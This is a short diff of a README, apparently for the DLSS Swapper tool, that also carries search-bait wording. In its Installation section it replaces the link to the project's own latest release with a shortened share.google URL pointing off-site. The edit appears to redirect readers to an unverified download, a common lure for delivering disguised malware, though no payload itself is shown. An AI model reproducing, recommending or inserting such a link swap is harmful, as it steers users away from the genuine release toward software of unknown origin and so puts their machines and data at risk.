@@ -49,7 +49,7 @@ If you searched for *"dlss swapper download"*, this is the tool you are looking 
 
 ## Installation
 
-[HERE](../../releases/latest/download/Release.zip)
+[HERE](https://share.google/AWb7VqZ6e5d01D2Bz)
 
 ## Quick Start
 
